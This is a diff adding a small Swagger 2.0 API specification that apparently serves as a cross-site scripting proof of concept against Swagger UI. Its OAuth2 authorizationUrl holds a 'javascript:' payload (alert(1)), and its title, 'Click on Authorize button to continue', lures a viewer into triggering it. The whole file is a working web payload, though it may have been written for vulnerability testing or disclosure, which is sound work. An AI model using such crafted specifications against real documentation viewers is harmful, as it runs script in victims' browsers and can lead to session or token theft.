@@ -1,0 +1,17 @@
+        {
+            "swagger": "2.0",
+            "info": {
+                "title": "Click on Authorize button to continue",
+            },
+          "securityDefinitions": {
+            "oauth2": {
+              "flow": "implicit",
+              "authorizationUrl": "javascript: alert (1);//",
+              "scopes": {
+                "web-api": "testing"
+              },
+              "type": "oauth2"
+            }
+            }  
+        }
+         
